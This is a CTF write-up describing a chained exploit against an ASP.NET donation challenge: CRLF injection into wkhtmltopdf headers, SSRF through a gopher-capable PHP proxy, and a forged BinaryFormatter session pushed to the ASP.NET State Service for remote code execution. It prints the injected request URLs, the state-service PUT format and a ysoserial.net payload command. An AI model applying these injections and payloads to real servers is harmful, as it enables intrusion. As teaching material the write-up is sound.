## Challenge Information

- Type: Web
- Solved: **0 / 728**
- Tags: `ASP.NET`, `Deserialization`, `SSRF`, `Gopher`, `CRLF Injection`

## Solution

In web.config, the session is being set to store in ASP.NET State Service.

Web.config:
```
<sessionState mode="StateServer" stateConnectionString="tcpip=localhost:42424" cookieless="false" timeout="20" />
```

The communication between ASP.NET and State Service is a HTTP-like protocol.

Example 1:
(Invisible characters are represented by dots)
```
========= Request =================
GET %2fLM%2fW3SVC%2f2%2fROOT(oXvpnxcuEWqKAgOETha32JavYZ6eCqrpTN5%2fHxWS854%3d)%2fbpr4mimb2vjnvtn2jc4yp3uo HTTP/1.1
Host: localhost
Exclusive: acquire

========= Response ================
200 OK
X-AspNet-Version: 4.0.30319
LockCookie: 2
Timeout: 20
Cache-Control: private
Content-Length: 30

...............key......value.
```

Example 2:
```
========= Request =================
PUT %2fLM%2fW3SVC%2f2%2fROOT(oXvpnxcuEWqKAgOETha32JavYZ6eCqrpTN5%2fHxWS854%3d)%2fbpr4mimb2vjnvtn2jc4yp3uo HTTP/1.1
Host: localhost
Timeout:20
Content-Length:30
ExtraFlags:0
LockCookie:2

...............key......value.
========= Response ================
200 OK
X-AspNet-Version: 4.0.30319
Cache-Control: private
Content-Length: 0

```

The session data is stored by using .NET serializaion technique (based on BinaryFormatter).
ASP.NET uses GET method to get session data and PUT method to update session data.

So the main idea is if we have a SSRF vulnerability that can send a PUT request to ASP.NET State Service, maybe we can get Remote Code Execution!

### Step 1: CRLF Injection

In this challenge, there is a feature that can let you download the receipt page as a PDF file.

Download PDF URL example:

```
http://donate.support.balsnctf.com/Donate/Preview?token=<token>&pdf=1
```

Look into C# code, this action receive the token parameter and save it in TempData, then just redirect to DownloadPdf internally.
```
public ActionResult Preview()
{
    string token = Request.Params.Get("token");
    bool doDownloadPdf = Request.Params.Get("pdf") != null;

    TempData["token"] = "Bearer " + token;

    if (doDownloadPdf)
    {
        return DownloadPdf();  // <- redirect to DownloadPdf action internally
    }
    else
    {
        return ReceiptDetail();
    }
}
```

In DownloadPdf, retrieve token from TempData, pass token to wkhtmltopdf.exe as a argument.
```
public FileResult DownloadPdf()
{
    string accessToken = Request.Headers.Get("Authorization");
    accessToken = (accessToken == null) ? (string)TempData["token"] : accessToken;
    string receiptUrlForPdf = ConfigurationManager.AppSettings["ReceiptUrlForPdf"];
    string tempFileName = Path.GetTempFileName();

    Process process = new Process();
    process.StartInfo.FileName = ConfigurationManager.AppSettings["Wkhtmltopdf"];
    process.StartInfo.Arguments = String.Format(
        "{0} --custom-header Authorization \"{1}\" {2}",
        receiptUrlForPdf,
        accessToken.Replace("\"", ""),
        tempFileName
    );
```

The command of wkhtmltopdf will look like:

```
wkhtmltopdf.exe
    http://donate.support.balsnctf.com/Donate/ReceiptDetail
    --custom-header Authorization "<token>"
    tempFileName
```

And yes, there is a CRLF injection on `--custom-header`.

If you request this url:
```
http://donate.support.balsnctf.com/Donate/Preview?token=aaaaa%0d%0abbbbb&pdf=1
```

Then you will receive this request:
```
GET /Donate/ReceiptDetail HTTP/1.1
Authorization: Bearer aaaaa
bbbbb
User-Agent: [redacted]
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: Keep-Alive
Accept-Encoding: gzip
Accept-Language: zh-TW,en,*
Host: donate.support.balsnctf.com
```

In this challenge, the domain "donate.support.balsnctf.com" is point to 127.0.0.1 on server by configuring `C:\Windows\System32\drivers\etc\hosts`. That means that we get a SSRF limited on 127.0.0.1:80.

### Step 2: SSRF with Gopher protocol

There is a virtual host "proxy.support.balsnctf.com" on Nginx, it hosts a `geturl.php` that can let you make request to any server with different protocol including `gopher://`

```
<?php
$url = $_POST['url'];
if (parse_url($url)['port'] == 9000) {
    die('blcoked!'); // avoid fastcgi exp
} else {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    $output = curl_exec($ch);
    curl_close($ch);
    print_r($output);
}
```

The only problem is that the host is only allowed to access from some IPs, e.g., `127.0.0.1`.
```
server {
        listen       80;
        server_name  proxy.support.balsnctf.com;

        # only allowed for private ip
        allow 192.168.0.0/16;
        allow 10.0.0.0/8;
        allow 127.0.0.1;
        deny all;
```

To access `geturl.php`, we have to use CRLF injection from step 1.

Inject a new request to nginx:

```
http://donate.support.balsnctf.com/Donate/Preview
?token=aaaa%0d%0aHost:+localhost%0d%0a%0d%0aPOST+/geturl.php+HTTP/1.1%0d%0aHost: proxy.support.balsnctf.com%0d%0aContent-Type:+application/x-www-form-urlencoded%0d%0aContent-Length:+37%0d%0a%0d%0aurl=gopher://your_ip:port/_gophertestGET+/+HTTP/1.1
&pdf=1
```

Then you can see that the request will look like:
```
GET /Donate/ReceiptDetail HTTP/1.1
Authorization: Bearer aaaa
Host: proxy.support.balsnctf.com

POST /geturl.php HTTP/1.1
Host: proxy.support.balsnctf.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

url=gopher://your_ip:port/_gophertestGET / HTTP/1.1
User-Agent: [redacted]
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: Keep-Alive
Accept-Encoding: gzip
Accept-Language: zh-TW,en,*
Host: proxy.support.balsnctf.com
```

Now, we have a SSRF with Gopher protocal that can send request to any server.

### Step 3: Construct PUT request for ASP.NET State Service

You can check out the entry `System.Web.SessionState.OutOfProcSessionStateStore.GetItemExclusive()` to see how the request is actually generated.

A basic PUT request format for updating session data is like:
```
PUT <AppDomainAppId>(<SHA256 of AppDomainAppId>)%2f<SessionId> HTTP/1.1
Host: localhost
Timeout:20
Content-Length:<length of session data>
ExtraFlags:0
LockCookie:2

<session data>
```

There are some fields which we have to fill:

**\<AppDomainAppId>**: 
This value is usually dynamically generated by ASP.NET, but we can write custom code in Global.asax to set it. Of course, it already be written done in this challenge, the value can be modified by setting up in Web.config:
```
<add key="ApplicationName" value="/LM/W3SVC/DONATE/ROOT"/>
```

**\<SHA256 of AppDomainAppId>**:
The SHA256 hash of AppDomainAppId in base64 encode:
```
base64(sha256("/LM/W3SVC/DONATE/ROOT")) = "Q382tQy2MH/DtwC0WQWxEWXoa3ZAQAq6kSajzPcAmuk="
```

**\<SessionId>**:
It's from HTTP request cookie, we can fill whatever we want. The only restriction is that the length of SessionId should be 24 and can only use letters or digits:
```
Cookie: ASP.NET_SessionId=cykucykucykucykucykucyku
```

**\<session data>**: 
The raw binary of serialized session data. This will be discussed in the next step. And don't forget to update Content-Length.

All fields have to be url encoded, except \<session data>.
After filling these fields, the whole request would look like:
```
PUT %2fLM%2fW3SVC%2fDONATE%2fROOT(Q382tQy2MH%2fDtwC0WQWxEWXoa3ZAQAq6kSajzPcAmuk%3d)%2fcykucykucykucykucykucyku HTTP/1.1
Host: localhost
Timeout:20
Content-Length:<length of session data>
ExtraFlags:1
LockCookie:0

...<session data>...
```

### Step 4: Generate evil 😈 session data (Deserialization)

The session data is deserialized by using `System.Web.SessionState.SessionStateUtility.DeserializeStoreData()`.

This method is based on `SessionStateItemCollection` and `HttpStaticObjectsCollection`. This tool [ysoserial.net](https://github.com/pwntester/ysoserial.net) already has a plugin to generate deserialization payload to exploit these two classes.

We can generate a RCE payload with this command:
```
ysoserial.exe
    -p Altserialization
    -M HttpStaticObjectsCollection
    -o base64 -c "<the windows command you wanna run>"
```

But this payload is just for exploiting `HttpStaticObjectsCollection`, what we want is to exploit `SessionStateUtility`. So we must modify the payload. This step will be processed done in my exploit code, basically it just needs to append 7 bytes to payload:

```
0x00 0x00 0x00 0x00 0x00 0x01 <payload> 0xff
```

## Step 5: Exploit

Combine everything together, use `gopher://` to send PUT request to state service to update a malicious session data.

Finally just refresh website with `ASP.NET_SessionId` cookie:
```
GET / HTTP/1.1
Host: donate.support.balsnctf.com
User-Agent: [redacted]
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Connection: close
Upgrade-Insecure-Requests: 1
Cookie: ASP.NET_SessionId=cykucykucykucykucykucyku

```

Then your command will be executed!

You can try it on your machine with my `exploit.py`, all you have to do is to replace `<payload from ysoserial.net>` with your payload. Also maybe need to modify TARGET to your machine.

And that's all, I hope you like it 😊

## References

- https://github.com/pwntester/ysoserial.net
- https://github.com/microsoft/referencesource/blob/1acafe20a789a55daa17aac6bb47d1b0ec04519f/System.Web/State/SessionStateUtil.cs#L209
- https://github.com/microsoft/referencesource/blob/1acafe20a789a55daa17aac6bb47d1b0ec04519f/System.Web/State/OutOfProcStateClientManager.cs#L530
